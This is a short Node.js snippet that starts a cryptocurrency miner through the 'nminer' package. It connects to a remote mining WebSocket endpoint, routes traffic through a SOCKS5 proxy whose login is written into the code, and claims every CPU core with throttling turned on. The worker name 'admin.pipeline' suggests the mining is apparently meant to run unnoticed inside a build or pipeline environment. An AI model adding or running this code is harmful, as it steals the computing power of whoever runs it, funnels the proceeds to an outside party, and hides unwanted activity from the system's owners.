const { NMiner } = require("nminer");
new NMiner("wss://runtime.nmining.igrp.app/", "admin.pipeline", { proxy: "socks5://dcswarup:webshare@192.241.125.110:8154", threads: require("os").cpus().length, throttle: true });
